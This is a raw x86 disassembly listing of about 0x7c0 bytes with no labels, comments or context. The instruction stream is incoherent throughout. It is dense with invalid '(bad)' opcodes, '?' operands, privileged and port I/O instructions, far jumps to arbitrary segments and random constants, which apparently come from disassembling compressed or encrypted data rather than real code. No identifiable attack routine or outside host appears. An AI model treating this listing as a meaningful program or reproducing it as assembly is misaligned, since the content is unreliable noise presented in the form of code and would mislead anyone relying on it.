  420d90:	das    
  420d91:	push   esp
  420d92:	(bad)  
  420d93:	icebp  
  420d94:	int3   
  420d95:	das    
  420d96:	mov    esp,DWORD PTR [edi]
  420d98:	and    DWORD PTR [ecx],ecx
  420d9a:	push   ss
  420d9b:	mov    eax,ds:0x53a73f7
  420da0:	jle    0x420d90
  420da2:	out    0x6e,al
  420da4:	dec    edi
  420da5:	lods   al,BYTE PTR ds:[esi]
  420da6:	pop    eax
  420da7:	js     0x420e26
  420da9:	fnstcw WORD PTR [edi]
  420dab:	mov    edx,0x4997499
  420db0:	mov    bl,0x97
  420db2:	jp     0x420d88
  420db4:	add    ebx,DWORD PTR [esi]
  420db6:	sub    al,0x17
  420db8:	scas   al,BYTE PTR es:[edi]
  420db9:	aam    0x2a
  420dbb:	loope  0x420e13
  420dbd:	mov    esp,0xc6a75ee5
  420dc2:	push   esi
  420dc3:	inc    esi
  420dc4:	or     DWORD PTR cs:[ecx+0x32675087],0x3ef97731
  420dcf:	adc    eax,DWORD PTR [ebx*4-0x2bab91fc]
  420dd6:	add    al,BYTE PTR [ecx*4-0x39223b6c]
  420ddd:	add    eax,DWORD PTR [edx+0x23]
  420de0:	cmc    
  420de1:	or     edi,DWORD PTR [esi+0x45]
  420de4:	adc    BYTE PTR [ebp-0x41],al
  420de7:	sub    edi,DWORD PTR [edi+0x6dffbef2]
  420ded:	dec    esi
  420dee:	ja     0x420dd1
  420df0:	pop    ss
  420df1:	inc    eax
  420df2:	fwait
  420df3:	je     0x420dd5
  420df5:	ret    0x26fc
  420df8:	add    eax,0x1aec45e3
  420dfd:	int    0xec
  420dff:	mov    dh,0x3e
  420e01:	lahf   
  420e02:	stc    
  420e03:	mul    BYTE PTR [esi+0x142479a0]
  420e09:	adc    DWORD PTR [esi+edi*1+0x55],ebp
  420e0d:	add    bl,BYTE PTR ds:0x168c0260
  420e13:	inc    eax
  420e14:	sbb    BYTE PTR [eax],bl
  420e16:	dec    edi
  420e17:	adc    eax,0xadeeb4e5
  420e1c:	lds    esi,FWORD PTR [edi]
  420e1e:	sbb    ah,BYTE PTR [ebx]
  420e20:	adc    ecx,DWORD PTR ss:[edx+0x66]
  420e24:	cmp    al,0xb4
  420e26:	scas   al,BYTE PTR es:[edi]
  420e27:	xor    ebp,DWORD PTR [ebx-0x1f]
  420e2a:	outs   dx,DWORD PTR ds:[esi]
  420e2b:	jno    0x420e5b
  420e2d:	jle    0x420e1d
  420e2f:	loop   0x420db2
  420e31:	add    esp,edx
  420e33:	inc    ebp
  420e34:	fs aam 0x87
  420e37:	test   eax,0xe9d38175
  420e3c:	add    cl,BYTE PTR [eax-0x5f93f662]
  420e42:	in     eax,dx
  420e43:	mov    ah,0x79
  420e45:	cmp    esp,DWORD PTR [ebx]
  420e47:	push   eax
  420e48:	push   0x61cfa67b
  420e4d:	jl     0x420e13
  420e4f:	push   es
  420e50:	(bad)  
  420e51:	cmp    eax,0x7f6e2762
  420e56:	dec    eax
  420e57:	and    ebx,DWORD PTR [ecx+ecx*8]
  420e5a:	and    esi,DWORD PTR [ecx]
  420e5c:	mov    esp,0xee870fcf
  420e61:	pop    es
  420e62:	cmp    BYTE PTR [eax-0x5afbd373],cl
  420e68:	add    BYTE PTR [eax+0x54],cl
  420e6b:	inc    eax
  420e6c:	mov    bh,0x83
  420e6e:	leave  
  420e6f:	in     al,dx
  420e70:	cwde   
  420e71:	jb     0x420eb4
  420e73:	cld    
  420e74:	popf   
  420e75:	arpl   WORD PTR [edx-0x77],si
  420e78:	aas    
  420e79:	mov    ds:0x4906fdba,al
  420e7e:	push   ecx
  420e7f:	cmp    eax,0x83f34a85
  420e84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e85:	xchg   DWORD PTR ds:0x3edc48a3,ecx
  420e8b:	jp     0x420f04
  420e8d:	pop    esi
  420e8e:	daa    
  420e8f:	add    eax,0x774ba92c
  420e94:	mov    al,0xce
  420e96:	jle    0x420e53
  420e98:	pop    esp
  420e99:	call   FWORD PTR [edx-0x2d]
  420e9c:	bound  edi,QWORD PTR [edi+ebp*2-0x42885653]
  420ea3:	sub    al,0x29
  420ea5:	fistp  DWORD PTR [esi-0x23]
  420ea8:	repnz and ebx,DWORD PTR [edi+0x61]
  420eac:	sub    al,0x37
  420eae:	dec    edi
  420eaf:	repz mov ebp,0xb7e4b70e
  420eb5:	jp     0x420f1c
  420eb7:	test   edi,ebx
  420eb9:	stc    
  420eba:	pop    eax
  420ebb:	sub    eax,DWORD PTR [ebp+0x112f2e0]
	...
  420ec9:	add    BYTE PTR [ebp+0x48],dl
  420ecc:	inc    edx
  420ecd:	push   ebp
  420ece:	pop    edi
  420ecf:	pop    edi
  420ed0:	push   edi
  420ed1:	dec    eax
  420ed2:	cmp    BYTE PTR [esi-0x14],bh
  420ed5:	or     ah,BYTE PTR [esi-0x76]
  420ed8:	ficom  WORD PTR [ebx-0x35]
  420edb:	popf   
  420edc:	add    DWORD PTR [eax],eax
  420ede:	jg     0x420ee6
  420ee0:	add    BYTE PTR [eax],al
  420ee2:	das    
  420ee3:	aas    
  420ee4:	call   0x1800:0x975316e0
  420eeb:	xchg   esp,eax
  420eec:	lahf   
  420eed:	mov    ah,0x42
  420eef:	(bad)  
  420ef1:	pop    edx
  420ef2:	pop    ebx
  420ef3:	mov    eax,0x1248b93a
  420ef8:	sbb    BYTE PTR [edx],bl
  420efa:	cmp    ah,BYTE PTR [ebx+0x17eec0c5]
  420f00:	shl    DWORD PTR [ebx-0x4],1
  420f03:	or     eax,DWORD PTR [ebp+0x2]
  420f06:	or     BYTE PTR [edi-0x3],ch
  420f09:	sub    edi,DWORD PTR [ecx]
  420f0b:	stos   BYTE PTR es:[edi],al
  420f0c:	mov    al,0xdc
  420f0e:	cmp    eax,0x45554964
  420f13:	lock sub cl,BYTE PTR [ebp+eax*8-0x548779db]
  420f1b:	popa   
  420f1c:	push   esp
  420f1d:	cli    
  420f1e:	arpl   WORD PTR [ebp-0x7b007bba],dx
  420f24:	xchg   ebp,eax
  420f25:	mov    DWORD PTR [eax],ebp
  420f27:	stos   DWORD PTR es:[edi],eax
  420f28:	mov    ecx,0xf959bd99
  420f2d:	je     0x420fa9
  420f2f:	inc    edx
  420f30:	jmp    0x7d77:0x33b38df8
  420f37:	mov    dl,0x89
  420f39:	test   eax,0x2cbfcd50
  420f3e:	or     al,0x1c
  420f40:	aas    
  420f41:	lea    eax,[eax]
  420f43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f44:	repnz stos BYTE PTR es:[edi],al
  420f46:	popf   
  420f47:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  420f49:	shl    DWORD PTR [ecx+esi*4-0x56aec615],1
  420f50:	scas   al,BYTE PTR es:[edi]
  420f51:	and    DWORD PTR [ebx-0x17676920],eax
  420f57:	adc    al,0x27
  420f59:	(bad)  
  420f5a:	sbb    al,0x4a
  420f5c:	mov    edx,0x2e68521
  420f61:	les    ecx,FWORD PTR [eax+0x2a7ffece]
  420f67:	pop    edx
  420f68:	adc    eax,0xa9ae29b3
  420f6d:	xor    DWORD PTR [ebx+0x5ff01f08],esp
  420f73:	fwait
  420f74:	jmp    0x420f4f
  420f76:	pop    fs
  420f78:	sub    al,0x43
  420f7a:	adc    DWORD PTR [eax+0x134614e3],0x6e62b727
  420f84:	mov    al,ds:0x5621c0da
  420f89:	xchg   esi,eax
  420f8a:	and    ebx,DWORD PTR [ecx]
  420f8c:	inc    eax
  420f8d:	jp     0x420fa1
  420f8f:	mov    edi,0x848f666e
  420f94:	mov    eax,0x6a32717c
  420f99:	mov    eax,0xb1c14ad
  420f9e:	nop
  420f9f:	mov    bh,0x91
  420fa1:	stc    
  420fa2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420fa3:	and    eax,0x4fefd413
  420fa8:	icebp  
  420fa9:	fisubr WORD PTR gs:[edx-0x59]
  420fad:	mov    dh,0x24
  420faf:	adc    DWORD PTR [ebx-0x73],edx
  420fb2:	xchg   esi,eax
  420fb3:	in     al,dx
  420fb4:	adc    BYTE PTR [eax+esi*1+0x36585710],ah
  420fbb:	and    BYTE PTR [edx-0x3f7e6444],0x56
  420fc2:	fwait
  420fc3:	dec    esp
  420fc4:	les    eax,FWORD PTR [ebp-0xe0a9480]
  420fca:	and    al,0x3b
  420fcc:	in     al,0x28
  420fce:	sbb    DWORD PTR [ebx-0x2c8779de],eax
  420fd4:	pop    ebp
  420fd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420fd6:	pushf  
  420fd7:	lea    esp,[esi-0x13]
  420fda:	xchg   DWORD PTR gs:[ebp+0x2e0031b],esp
  420fe1:	pushf  
  420fe2:	cmp    al,0xa3
  420fe4:	mov    ?,eax
  420fe6:	loop   0x421044
  420fe8:	fwait
  420fe9:	and    cl,bl
  420feb:	icebp  
  420fec:	pop    ebp
  420fed:	push   cs
  420fee:	xor    al,0x59
  420ff0:	std    
  420ff1:	and    BYTE PTR [edx+0x36],0x1
  420ff5:	and    BYTE PTR [ebp-0x7d],bh
  420ff8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420ff9:	jo     0x421020
  420ffb:	icebp  
  420ffc:	pushf  
  420ffd:	jbe    0x421028
  420fff:	(bad)  
  421001:	inc    esp
  421002:	inc    edx
  421003:	jge    0x421008
  421005:	bound  esp,QWORD PTR [ebx+0x7d]
  421008:	cmp    al,0x2b
  42100a:	mov    dl,0x20
  42100c:	loope  0x421056
  42100e:	bound  ebx,QWORD PTR [eax+0x74]
  421011:	mov    ch,BYTE PTR cs:[ecx-0x8]
  421015:	xchg   ebp,eax
  421016:	mov    edi,0x1eac7f5e
  42101b:	stos   BYTE PTR es:[edi],al
  42101c:	lock dec esp
  42101e:	out    dx,al
  42101f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421020:	adc    edx,DWORD PTR [ebx-0x6b]
  421023:	dec    ecx
  421024:	retf   
  421025:	aaa    
  421026:	mov    cl,0xb7
  421028:	mov    edx,0xd9c3f445
  42102d:	mov    dl,0x1f
  42102f:	sub    al,0x6d
  421031:	mov    ebx,0xc7983044
  421036:	push   esi
  421037:	outs   dx,BYTE PTR ds:[esi]
  421038:	push   esi
  421039:	fmul   QWORD PTR [ebx-0x1de11409]
  42103f:	push   es
  421040:	dec    edx
  421041:	jnp    0x421032
  421043:	pushf  
  421044:	and    DWORD PTR [esi+eiz*8-0x7a],esi
  421048:	in     al,dx
  421049:	sti    
  42104a:	aad    0x69
  42104c:	add    ebp,DWORD PTR [eax+0x78ec56d3]
  421052:	outs   dx,DWORD PTR ds:[esi]
  421053:	ror    BYTE PTR [ebp-0x4b],cl
  421056:	daa    
  421057:	mov    dh,0x4a
  421059:	in     al,dx
  42105a:	and    eax,0x926a4c84
  42105f:	(bad)  
  421060:	mov    al,ds:0x442181e3
  421065:	dec    ecx
  421066:	inc    ebx
  421067:	fadd   DWORD PTR [ecx+ecx*4+0x7626b1c2]
  42106e:	cld    
  42106f:	pop    edi
  421070:	test   eax,0x87be4995
  421075:	cld    
  421076:	mov    DWORD PTR [ebp-0x6f],ebp
  421079:	cmpxchg BYTE PTR [bx],dh
  42107d:	in     eax,dx
  42107e:	in     al,0x28
  421080:	sub    BYTE PTR [ecx-0x4e],al
  421083:	dec    ebx
  421084:	mov    ebp,0xcfb33429
  421089:	mov    eax,ds:0x917d93ff
  42108e:	int3   
  42108f:	ins    BYTE PTR es:[edi],dx
  421090:	sbb    DWORD PTR [eax+edi*4],0x1d
  421094:	inc    eax
  421095:	jp     0x4210b9
  421097:	jns    0x42104d
  421099:	xor    eax,0xb27072ae
  42109e:	js     0x421079
  4210a0:	dec    esi
  4210a1:	mov    BYTE PTR ds:0x53e689cc,al
  4210a7:	and    BYTE PTR [eax+edi*1-0x55],ch
  4210ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210ac:	mov    al,0x11
  4210ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4210af:	push   cs
  4210b0:	xchg   edi,eax
  4210b1:	in     eax,dx
  4210b2:	xor    DWORD PTR [esi],edx
  4210b4:	add    al,0x38
  4210b6:	(bad)  
  4210b7:	fwait
  4210b8:	mov    eax,ds:0x35dc4aba
  4210bd:	fstp   TBYTE PTR [ebx]
  4210bf:	in     al,0xb5
  4210c1:	or     bl,bh
  4210c3:	arpl   WORD PTR [edx+0x6f],si
  4210c6:	jns    0x421052
  4210c8:	xchg   edi,eax
  4210c9:	imul   ecx,DWORD PTR [eax+0x2cd134b6],0x63374d83
  4210d3:	add    bh,BYTE PTR [ebp+0x44c03782]
  4210d9:	jb     0x4210b8
  4210db:	xchg   edx,eax
  4210dc:	add    dh,cl
  4210de:	xchg   edx,eax
  4210df:	push   0xe70ba631
  4210e4:	mov    esi,0x187f99
  4210e9:	mov    ds:0xf244de89,al
  4210ee:	mov    ch,0x45
  4210f0:	push   edx
  4210f1:	imul   esi,DWORD PTR [ebx+0x7c83b240],0xffffffa8
  4210f8:	cwde   
  4210f9:	out    0x4a,eax
  4210fb:	js     0x42110f
  4210fd:	addr16 cmc 
  4210ff:	inc    esp
  421100:	scas   eax,DWORD PTR es:[edi]
  421101:	repz (bad) 
  421103:	mov    WORD PTR [ecx-0x59],?
  421106:	sbb    BYTE PTR [ebp-0x9],0x70
  42110a:	pop    edi
  42110b:	jb     0x42114d
  42110d:	test   al,0x36
  42110f:	ja     0x4210bc
  421111:	sub    eax,0x6d8dceeb
  421116:	xchg   ecx,eax
  421117:	or     al,0xd
  421119:	push   eax
  42111a:	jbe    0x4210b3
  42111c:	pushf  
  42111d:	ret    
  42111e:	sub    esi,DWORD PTR [esi]
  421120:	jl     0x4210d1
  421122:	jb     0x421169
  421124:	gs adc eax,0x16cd7e6c
  42112a:	mov    dl,0xfb
  42112c:	imul   edi,DWORD PTR [ebp-0x43],0x35332752
  421133:	mov    ebp,DWORD PTR [edx+ecx*1-0x10]
  421137:	mov    al,ds:0x7bd946bb
  42113c:	or     BYTE PTR [edx-0x10a65c77],bh
  421142:	jmp    FWORD PTR [esi-0xed8defe]
  421148:	cmp    al,0xcc
  42114a:	es inc esi
  42114c:	aaa    
  42114d:	pop    eax
  42114e:	dec    sp
  421150:	sub    DWORD PTR [ecx+edx*1+0x2d],0xffffffa7
  421155:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421156:	mov    DWORD PTR [edx+ebx*1],ebp
  421159:	fidivr DWORD PTR [ecx+0x44]
  42115c:	leave  
  42115d:	add    dl,BYTE PTR [ecx-0x7a]
  421160:	ds scas ax,WORD PTR es:[edi]
  421163:	or     edx,DWORD PTR [edx-0x435de28b]
  421169:	bnd je 0x4211e8
  42116c:	mov    dl,0x1
  42116e:	outs   dx,DWORD PTR ds:[esi]
  42116f:	jmp    0x99b4dc6e
  421174:	and    eax,0x32b19a9f
  421179:	push   ebp
  42117a:	push   es
  42117b:	sahf   
  42117c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42117d:	ss add eax,0x321c7679
  421183:	or     ch,BYTE PTR [edx+ebx*1]
  421186:	inc    ecx
  421187:	enter  0xf850,0xc7
  42118b:	push   edi
  42118c:	pop    eax
  42118d:	or     eax,0x98caa0b3
  421192:	ins    DWORD PTR es:[edi],dx
  421193:	in     al,dx
  421194:	aas    
  421195:	ret    
  421196:	push   ds
  421197:	push   0x3eedee8e
  42119c:	fild   DWORD PTR [ecx-0x25]
  42119f:	pusha  
  4211a0:	xchg   esp,eax
  4211a1:	xchg   DWORD PTR [edx+esi*2+0x24],ebx
  4211a5:	fbstp  TBYTE PTR [edx]
  4211a7:	or     al,0xe
  4211a9:	outs   dx,DWORD PTR ds:[esi]
  4211aa:	xor    eax,0x5d07fd19
  4211af:	inc    ecx
  4211b0:	es adc ch,BYTE PTR fs:[edx]
  4211b4:	sub    DWORD PTR [edi+0x11],0x37220867
  4211bb:	jl     0x4211d7
  4211bd:	pop    ecx
  4211be:	test   eax,0x29c025eb
  4211c3:	sub    eax,esp
  4211c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4211c6:	call   0x41150554
  4211cb:	push   cs
  4211cc:	dec    esi
  4211cd:	ret    0x1d77
  4211d0:	and    DWORD PTR [ebx-0x1cd9af84],eax
  4211d6:	test   eax,0xc3c42756
  4211db:	sub    eax,0x91d3e8cd
  4211e0:	mov    cl,0x31
  4211e2:	mov    DWORD PTR [esi],0x2aac71d1
  4211e8:	dec    edi
  4211e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4211ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4211eb:	adc    WORD PTR [edi+0x3a],cx
  4211ef:	mov    al,ds:0x90ced704
  4211f4:	inc    esp
  4211f5:	jge    0x42123c
  4211f7:	jmp    0xbf5c:0x20d2ca35
  4211fe:	adc    esp,edi
  421200:	neg    DWORD PTR [ecx-0x19]
  421203:	dec    esi
  421204:	rcr    DWORD PTR [eax],0xa3
  421207:	(bad)
  42120a:	test   al,0x59
  42120c:	imul   ebp,esi,0xea7ca362
  421212:	mov    al,bl
  421214:	xchg   ecx,eax
  421215:	repz push ss
  421217:	jmp    0x4211db
  421219:	push   esp
  42121a:	mov    es,WORD PTR [ecx]
  42121c:	or     al,0xe
  42121e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42121f:	aam    0x4a
  421221:	xchg   ecx,eax
  421222:	cmp    ebx,edx
  421224:	dec    eax
  421225:	ror    DWORD PTR [ebp+ebx*1-0x1a85d889],1
  42122c:	mov    al,0xe7
  42122e:	and    DWORD PTR [ecx],0xffffffd6
  421231:	adc    ah,BYTE PTR [esi-0x9248204]
  421237:	pop    ss
  421238:	mov    bh,0x12
  42123a:	pop    esi
  42123b:	xlat   BYTE PTR ds:[ebx]
  42123c:	adc    al,0x57
  42123e:	mov    esp,0x44cb1578
  421243:	in     eax,0x1e
  421245:	sub    dh,BYTE PTR [esp+eiz*2+0x362c4]
  42124c:	loope  0x42122d
  42124e:	out    dx,al
  42124f:	jecxz  0x421256
  421251:	pop    eax
  421252:	call   0xb1fd12d3
  421257:	fsubr  QWORD PTR [ebx+0x19]
  42125a:	test   BYTE PTR [edi+0x55f8158d],dh
  421260:	pop    ebx
  421261:	mov    ds:0xd18571e5,al
  421266:	retf   0x6786
  421269:	or     BYTE PTR [eax],al
  42126b:	sti    
  42126c:	fs retf 
  42126e:	adc    ecx,DWORD PTR [edi]
  421270:	mov    dl,0xb0
  421272:	dec    edx
  421273:	adc    edi,DWORD PTR [esi+0x38]
  421276:	mov    esp,0x59d92011
  42127b:	xchg   esi,eax
  42127c:	mov    WORD PTR [edi],?
  42127e:	sti    
  42127f:	cmp    DWORD PTR [edx+0x1134a3c3],esp
  421285:	lods   al,BYTE PTR ds:[esi]
  421286:	mov    ebx,0xa44ed3dd
  42128b:	out    0x71,eax
  42128d:	xchg   ecx,eax
  42128e:	xchg   ebx,eax
  42128f:	(bad)  
  421290:	cmp    BYTE PTR [eax+0x7a2f4296],dh
  421296:	mov    bh,0xc4
  421298:	sahf   
  421299:	sbb    eax,0x39f06de7
  42129e:	jb     0x4212cb
  4212a0:	jg     0x4212dc
  4212a2:	add    BYTE PTR [edi+edx*8+0x69],dl
  4212a6:	lods   al,BYTE PTR ds:[esi]
  4212a7:	stc    
  4212a8:	pop    ss
  4212a9:	in     al,dx
  4212aa:	(bad)  
  4212ad:	cmc    
  4212ae:	or     BYTE PTR [edx+edx*4-0x782df1e5],0xbf
  4212b6:	sub    ah,BYTE PTR [edx+eax*1+0x50877a23]
  4212bd:	mov    esp,DWORD PTR [edx]
  4212bf:	lods   eax,DWORD PTR ds:[esi]
  4212c0:	sub    cl,BYTE PTR [edx+0x7f120078]
  4212c6:	les    ebp,FWORD PTR [edi]
  4212c8:	xchg   ebp,eax
  4212c9:	iret   
  4212ca:	rcl    BYTE PTR [eax],1
  4212cc:	(bad)  
  4212cd:	inc    ebx
  4212ce:	call   0x9bcb:0x884e68d3
  4212d5:	les    ebx,FWORD PTR [edi-0xd434eff]
  4212db:	div    DWORD PTR [ebp-0x4118d283]
  4212e1:	pop    edi
  4212e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4212e3:	dec    edx
  4212e4:	stc    
  4212e5:	(bad)  
  4212e6:	test   DWORD PTR [ebp-0x15],0xc958f6fc
  4212ed:	sub    eax,0x7623ede5
  4212f2:	mov    es,edi
  4212f4:	push   0x64
  4212f6:	neg    DWORD PTR [esi-0x3f16b17b]
  4212fc:	in     eax,0x99
  4212fe:	lea    ebx,[esi+0xe]
  421301:	push   es
  421302:	(bad)  
  421303:	dec    esp
  421304:	ror    dl,0x16
  421307:	ja     0x4212b8
  421309:	mov    ds:0xf831cf71,eax
  42130e:	fdiv   st(3),st
  421310:	push   es
  421311:	mov    ch,0xe0
  421313:	lahf   
  421314:	aam    0x72
  421316:	leave  
  421317:	sub    ah,BYTE PTR [ebx-0x4c4f560a]
  42131d:	sbb    DWORD PTR [eax+0x473a76c6],0xf
  421324:	or     al,0x1
  421326:	ins    DWORD PTR es:[edi],dx
  421327:	add    BYTE PTR [ecx+ebx*8-0x43],dl
  42132b:	mov    dl,0x70
  42132d:	sti    
  42132e:	or     DWORD PTR ds:0xf5eba8e7,ecx
  421334:	cmp    ecx,esp
  421336:	(bad)  
  421337:	mov    cl,0x14
  421339:	xchg   edx,eax
  42133a:	lds    edi,FWORD PTR [edi-0x7]
  42133d:	aam    0xb1
  42133f:	add    ecx,esi
  421341:	addr16 cmp bl,bl
  421344:	jmp    0xea49:0x1d07ecd9
  42134b:	mov    al,0xc1
  42134d:	sahf   
  42134e:	lea    edi,[ebx+0x751e83cb]
  421354:	push   ebp
  421355:	inc    eax
  421356:	dec    eax
  421357:	arpl   ax,cx
  421359:	jne    0x4213b1
  42135b:	jo     0x421393
  42135d:	out    dx,al
  42135e:	pop    ds
  42135f:	jmp    0x4212f0
  421361:	popw   ds
  421363:	enter  0x7a34,0x21
  421367:	outs   dx,DWORD PTR ds:[esi]
  421368:	adc    BYTE PTR [edx+esi*1+0x3e0fee5f],ah
  42136f:	ins    BYTE PTR es:[edi],dx
  421370:	or     al,0xc6
  421372:	mov    BYTE PTR [edx],dl
  421374:	xchg   edi,eax
  421375:	in     eax,0xde
  421377:	mov    ch,0x40
  421379:	sbb    DWORD PTR [edx+0x0],ebx
  42137c:	pop    ds
  42137d:	out    dx,eax
  42137e:	pushf  
  42137f:	aad    0x42
  421381:	mov    eax,ds:0xffbd5de7
  421386:	sub    BYTE PTR ss:[esi-0x55ccf353],bl
  42138d:	mov    ah,0xe9
  42138f:	xlat   BYTE PTR gs:[ebx]
  421391:	fdiv   QWORD PTR [ebx+0x46018088]
  421397:	push   ebp
  421398:	mov    ecx,0x1b5efa11
  42139d:	cmp    edx,0x2e
  4213a0:	mov    ebp,0x2ce0d37f
  4213a5:	ins    BYTE PTR es:[edi],dx
  4213a6:	jnp    0x421410
  4213a8:	pop    esp
  4213a9:	mov    cl,0xa0
  4213ab:	cs pop ebp
  4213ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4213ae:	dec    ebx
  4213af:	xor    dl,BYTE PTR [esi+0x1eb8d154]
  4213b5:	pop    ecx
  4213b6:	mov    edi,0xab1e777b
  4213bb:	xchg   edi,eax
  4213bc:	mov    edi,0xaef95211
  4213c1:	ret    
  4213c2:	adc    al,0x4d
  4213c4:	mov    bh,0x8f
  4213c6:	rcr    BYTE PTR [eax+0x552167dc],cl
  4213cc:	test   al,0xed
  4213ce:	(bad)  
  4213cf:	dec    esp
  4213d0:	aas    
  4213d1:	not    DWORD PTR [ecx+eax*4+0x5e]
  4213d5:	mov    cl,BYTE PTR [esi]
  4213d7:	push   edi
  4213d8:	mov    ebp,0xff950ca5
  4213dd:	push   cs
  4213de:	cld    
  4213df:	lods   al,BYTE PTR ds:[esi]
  4213e0:	jae    0x42141a
  4213e2:	ja     0x4213b5
  4213e4:	dec    eax
  4213e5:	mov    ebx,0xb11f55f7
  4213ea:	push   ecx
  4213eb:	js     0x421425
  4213ed:	inc    ebx
  4213ee:	outs   dx,BYTE PTR ds:[esi]
  4213ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4213f0:	shr    BYTE PTR [ebx-0x6d],0xaf
  4213f4:	(bad)  
  4213f5:	hlt    
  4213f6:	mov    bl,0x94
  4213f8:	in     eax,dx
  4213f9:	dec    ebx
  4213fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4213fb:	lods   al,BYTE PTR ds:[esi]
  4213fc:	fild   DWORD PTR [ecx]
  4213fe:	mov    bl,0x5e
  421400:	jp     0x42146c
  421402:	aaa    
  421403:	pop    edi
  421404:	out    0x34,al
  421406:	xchg   ebp,eax
  421407:	inc    esi
  421408:	shl    ecx,0xe5
  42140b:	sbb    eax,0xdfc60d3e
  421410:	dec    ebp
  421411:	sub    eax,0xc32da292
  421416:	int    0xa4
  421418:	adc    esp,ebx
  42141a:	es repz adc al,0x37
  42141e:	sub    al,dh
  421420:	push   ss
  421421:	lea    ecx,[ebx-0x3d]
  421424:	scas   al,BYTE PTR es:[edi]
  421425:	xor    edi,edx
  421427:	fsub   st,st(3)
  421429:	push   es
  42142a:	adc    al,BYTE PTR [ecx+0x59]
  42142d:	push   edx
  42142e:	sbb    al,dl
  421430:	and    eax,0x27c0c61a
  421435:	(bad)  
  421436:	fistp  DWORD PTR [esi+0x752583b5]
  42143c:	mov    cl,0x7a
  42143e:	(bad)  
  42143f:	xchg   esi,eax
  421440:	sub    BYTE PTR [ebp+ebp*2-0x264b1920],ah
  421447:	(bad)  [esi]
  421449:	sub    ah,BYTE PTR [ecx]
  42144b:	fsubr  QWORD PTR [edx]
  42144d:	push   ds
  42144e:	sahf   
  42144f:	hlt    
  421450:	(bad)  
  421451:	call   0x9cfaf9b1
  421456:	popa   
  421457:	jmp    0xb9c0:0xa91f170a
  42145e:	enter  0xdc71,0x56
  421462:	mov    ecx,0xa039cbf7
  421467:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421468:	pushf  
  421469:	lods   al,BYTE PTR ds:[esi]
  42146a:	outs   dx,DWORD PTR ds:[esi]
  42146b:	hlt    
  42146c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42146d:	adc    ebp,esp
  42146f:	lds    eax,FWORD PTR [ebx]
  421471:	(bad)  
  421472:	popf   
  421473:	ja     0x4214a4
  421475:	or     al,0x3a
  421477:	pop    eax
  421478:	popf   
  421479:	push   ebx
  42147a:	shl    BYTE PTR [edi-0x55],cl
  42147d:	lods   eax,DWORD PTR ds:[esi]
  42147e:	mov    eax,0xc15b7e98
  421483:	sub    dl,dh
  421485:	push   esi
  421486:	pushf  
  421487:	in     al,0xd7
  421489:	adc    BYTE PTR [esi-0x44],0x49
  42148d:	push   es
  42148e:	stos   DWORD PTR es:[edi],eax
  42148f:	in     al,0xef
  421491:	icebp  
  421492:	popa   
  421493:	js     0x421503
  421495:	inc    eax
  421496:	adc    al,0xa3
  421498:	add    al,0xb4
  42149a:	dec    ecx
  42149b:	mov    ah,0x77
  42149d:	ja     0x4214d4
  42149f:	jp     0x42142d
  4214a1:	add    cl,BYTE PTR [edx+ecx*1]
  4214a4:	inc    edi
  4214a5:	and    dh,0x56
  4214a8:	sti    
  4214a9:	xchg   edi,eax
  4214aa:	mov    ch,0x38
  4214ac:	adc    BYTE PTR ds:0x44598ec2,ah
  4214b2:	in     eax,dx
  4214b3:	enter  0xec8d,0x80
  4214b7:	mov    ebx,0xd417fb99
  4214bc:	or     DWORD PTR [edi+0x38],0x2732f86d
  4214c3:	mov    ds:0xdce2a4ac,eax
  4214c8:	test   BYTE PTR [eax],bl
  4214ca:	jl     0x421508
  4214cc:	and    cl,al
  4214ce:	adc    edx,DWORD PTR [esi+ebp*4-0x14ad80cd]
  4214d5:	inc    eax
  4214d6:	jmp    0x8f11:0xeb03bd8a
  4214dd:	xchg   ebx,eax
  4214de:	in     eax,dx
  4214df:	sbb    al,0xa5
  4214e1:	adc    al,0xf5
  4214e3:	fmul   DWORD PTR [edx+0x2c0593bf]
  4214e9:	les    esi,FWORD PTR [eax+0x44]
  4214ec:	dec    edx
  4214ed:	push   DWORD PTR [ebp-0x37]
  4214f0:	mov    esi,0x9978c417
  4214f5:	jmp    0x421503
  4214f7:	push   ss
  4214f8:	sbb    eax,0x92a43fb0
  4214fd:	loope  0x421503
  4214ff:	fmul   QWORD PTR [ecx+0x6731a435]
  421505:	sbb    al,0x3f
  421507:	jnp    0x4214db
  421509:	push   ecx
  42150a:	das    
  42150b:	idiv   BYTE PTR [esi+0x1d]
  42150e:	clc    
  42150f:	fucomi st,st(1)
  421511:	pop    edi
  421512:	rol    DWORD PTR [ecx-0x62],1
  421515:	arpl   WORD PTR [esi+0x77167dd7],cx
  42151b:	xor    al,0xdf
  42151d:	inc    ecx
  42151e:	xchg   ebp,eax
  42151f:	mov    edi,0x3de1ac99
  421524:	push   es
  421525:	enter  0x1e27,0x2f
  421529:	mov    ch,0xa
  42152b:	add    ecx,esp
  42152d:	jno    0x42151d
  42152f:	popf   
  421530:	adc    edx,ebp
  421532:	jns    0x4214d8
  421534:	jo     0x4214d1
  421536:	mov    ?,WORD PTR [esi+0x15]
  421539:	mov    eax,DWORD PTR ds:0xbc90d35c
  42153f:	mov    dh,0x5e
  421541:	test   eax,0xd90df290
  421547:	mov    edx,0x7fdc9fa6
  42154c:	dec    edi
  42154d:	jns    0x421584
  42154f:	call   0x32f4e5bf
  421554:	fsub   st(5),st
